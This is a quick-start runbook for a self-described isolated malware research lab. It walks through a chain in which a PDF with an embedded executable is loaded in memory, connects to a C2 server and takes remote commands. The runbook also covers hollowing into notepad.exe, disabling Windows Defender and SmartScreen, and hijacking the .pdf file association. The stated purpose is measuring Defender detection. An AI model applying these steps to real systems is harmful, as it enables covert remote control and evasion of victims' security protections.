================================================================================
PHANTOM-X :: WINDOWS 11 PRO -- QUICK START
================================================================================

KYA YE HAI
    Research lab for the chain:
        PDF -> embedded PE -> in-memory mapping -> execution -> C2
    Runs on a personally owned, isolated Windows 11 Pro VM.

    Read this file once, then follow the steps in order.


--------------------------------------------------------------------------------
STEP 0 -- KALI (attacker/operator machine) : start the C2
--------------------------------------------------------------------------------
    cd /home/syco/phantom-x/phase5_network
    python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl

    NOTE the IP Kali printed. The VM needs it. Find it with:
        ip -4 addr show | grep -oP 'inet \K[\d.]+'

    LEAVE THIS TERMINAL OPEN. It is the operator console.


--------------------------------------------------------------------------------
STEP 1 -- VM : get the files across
--------------------------------------------------------------------------------
    Option A -- USB / shared folder:
        Copy the whole phantom-x-vm-lab folder to C:\pxvm\

    Option B -- scp from Kali:
        scp -r phantom-x-vm-lab user@<VM-IP>:C:/pxvm/

    Result: C:\pxvm\ containing px_loader.exe, px_payload.exe, px_hollow.exe,
            px_attack_chain.pdf, the .ps1 scripts and the .py files.


--------------------------------------------------------------------------------
STEP 2 -- VM : can the VM reach Kali?
--------------------------------------------------------------------------------
    In an elevated PowerShell on the VM:
        Test-NetConnection -ComputerName <KALI-IP> -Port 9001

    Expect: TcpTestSucceeded : True
    If False -> the VM's NIC is in NAT mode. Change it to host-only or
    bridged in the hypervisor, then retest.

    Firewall on Kali (if it blocks the VM):
        sudo ufw allow from <VM-IP> to any port 9001 proto tcp


--------------------------------------------------------------------------------
STEP 3 -- VM : prepare (execution policy + unblock)
--------------------------------------------------------------------------------
    cd C:\pxvm
    .\setup_vm.ps1 -LabFolder C:\pxvm

    Fixes the "not digitally signed" error, reports the Defender posture,
    and creates the reports folder.
    It prints everything it changed.

    If it complains that Tamper Protection is on, note it -- the Defender A/B
    step will not be possible until that is turned off.


--------------------------------------------------------------------------------
STEP 4 -- VM : capture the BEFORE state
--------------------------------------------------------------------------------
    .\collect_defender.ps1 -Label before_run1

    STOP CONDITION: open reports\before_run1_defender_status.json and confirm
    "RealTimeProtectionEnabled": true
    If it is false -> fix it before continuing. Everything the report claims
    about Defender depends on it being on.


--------------------------------------------------------------------------------
STEP 5 -- VM : run the chain
--------------------------------------------------------------------------------
    cd C:\pxvm
    $env:PX_C2_HOST = "<KALI-IP>"
    $env:PX_C2_PORT = "9001"
    .\px_loader.exe .\px_attack_chain.pdf .\loader.log

    The terminal will appear to hang. THAT IS CORRECT -- the payload is
    running in a loop. Leave it.

    Expected in loader.log:
        [loader] embedded file: inflated bytes (encoded flate)
        [loader] PE: machine=0x8664 ...
        [loader] mapped at preferred base ...
        [loader] resolved 31 import(s)
        [loader] calling entry point ...
        [px] connecting to <KALI-IP>:9001
        [px] connected

    Nothing is written to disk for the payload. It is extracted from the PDF
    straight into memory and executed there.


--------------------------------------------------------------------------------
STEP 6 -- KALI : drive it
--------------------------------------------------------------------------------
    In the OTHER terminal, where c2_server.py is running:
        c2> list
        c2> exec 1 whoami
        c2> exec 1 cmd /c ver
        c2> exec 1 cmd /c tasklist
        c2> ping 1
        c2> kill 1

    Command reference:
        list                 show sessions
        exec <id|all> <cmd>  run a command
        ping <id|all>        measure round-trip latency
        kill <id|all>        send EXIT (controlled termination)
        stats                counters and audit log path
        help                 full list
        quit                 stop the server

    Everything is recorded in c2_audit.jsonl on Kali.


--------------------------------------------------------------------------------
STEP 7 -- VM : capture the AFTER state
--------------------------------------------------------------------------------
    Open a SECOND PowerShell on the VM (the first one is still busy):
        cd C:\pxvm
        .\collect_defender.ps1 -Label after_run1

    Then stop the loader: Ctrl+C in the first terminal.


--------------------------------------------------------------------------------
STEP 8 -- VM (optional) : run it INSIDE another process
--------------------------------------------------------------------------------
    .\px_hollow.exe "C:\Windows\System32\notepad.exe" .\px_attack_chain.pdf

    Same chain, but the payload runs INSIDE notepad: notepad's original
    image is unmapped, the payload is mapped in its place, and the payload
    runs on a thread inside that process. The C2 session's pid will be
    notepad's pid, not px_hollow.exe's.

    Test it end to end:
        python test_hollow_integration.py


--------------------------------------------------------------------------------
STEP 9 -- VM (optional) : the Defender A/B arm
--------------------------------------------------------------------------------
    Turn the whole Microsoft security stack off:
        .\lab_disable_microsoft_security.ps1 -Action disable -AddLabExclusions -LabFolder C:\pxvm

    That disables real-time protection, behaviour monitoring, IOAV, SCRIPT
    SCANNING (which is what engages AMSI), archive scanning, PUA protection,
    controlled folder access, network protection and SmartScreen.

    A scheduled task re-arms the restore in 2 minutes, so the VM cannot be
    left undefended by accident.

    Repeat steps 5-7 with a different label:
        .\run_chain_on_vm.ps1 -KaliHost <KALI-IP> -KaliPort 9001 -Label run1_off

    RESTORE (do not skip):
        .\lab_disable_microsoft_security.ps1 -Action restore

    The comparison between run1 and run1_off is the actual experiment.


--------------------------------------------------------------------------------
STEP 10 -- VM (optional) : double-click the PDF, nothing else
--------------------------------------------------------------------------------
    IMPORTANT: do this LAST. If the handler is installed first, the reader
    never opens and you will wrongly conclude the reader blocked the file.

    \install_pdf_handler.ps1 -LoaderPath C:\pxvm\px_loader.exe

    Now double-click any .pdf in Explorer. No console, no prompt: the loader
    runs against it.

    Verify the association:
        Get-ItemProperty "HKCU:\Software\Classes\.pdf" | Select-Object "(default)"

    If your PDF reader still opens instead, Windows has a UserChoice entry
    that overrides registry associations. The installer removes it, but if
    you had chosen a default app in Settings, re-pick it afterwards.

    Remove the handler:
        .\install_pdf_handler.ps1 -Uninstall


--------------------------------------------------------------------------------
STEP 11 -- collect and send back
--------------------------------------------------------------------------------
    From the VM:
        C:\pxvm\reports\before_run1_summary.json
        C:\pxvm\reports\after_run1_summary.json
        C:\pxvm\loader_run1.log
    From Kali:
        c2_audit.jsonl

    Plus these four facts:
        reader product + version          Help > About
        Defender version                  Get-MpComputerStatus | Select AMProductVersion
        did Defender alert? (event ID)    from the before/after summaries
        Sysmon event IDs seen             1 process, 3 network, 11 file, 22 DNS


--------------------------------------------------------------------------------
TROUBLESHOOTING
--------------------------------------------------------------------------------
  [px] connect failed (10061)
      The C2 is not running on Kali, or a firewall is blocking it.
      Check:  sudo ufw allow from <VM-IP> to any port 9001 proto tcp

  Test-NetConnection says False
      The VM is in NAT mode. Switch it to host-only / bridged.

  "not digitally signed"
      Get-ChildItem C:\pxvm -Recurse -File | Unblock-File
      or run setup_vm.ps1 (it does this).

  c2> list shows "no sessions"
      The VM side never connected. Read loader.log.

  "ABORTED: Real-Time Protection is OFF"
      run_chain_on_vm.ps1 refuses to run undefended by default.
      Turn Defender on, or use -AllowDefenderOff for a deliberate A/B arm.

  The loader exits immediately with no output
      Run it from the folder containing px_attack_chain.pdf, or give the
      full path to the PDF.

  Nothing happens when a PDF is double-clicked
      Check HKCU\Software\Classes\.pdf and the UserChoice key. See STEP 10.


--------------------------------------------------------------------------------
SAFETY
--------------------------------------------------------------------------------
  * The C2 must stay on the isolated lab network. Never expose it publicly.
  * The payload has NO persistence. A reboot ends the session. Deliberate.
  * The payload only ever affects its own process.
  * Restore Defender after the A/B arm. The before/after snapshots are the
    evidence that it was on during the measured runs.
================================================================================
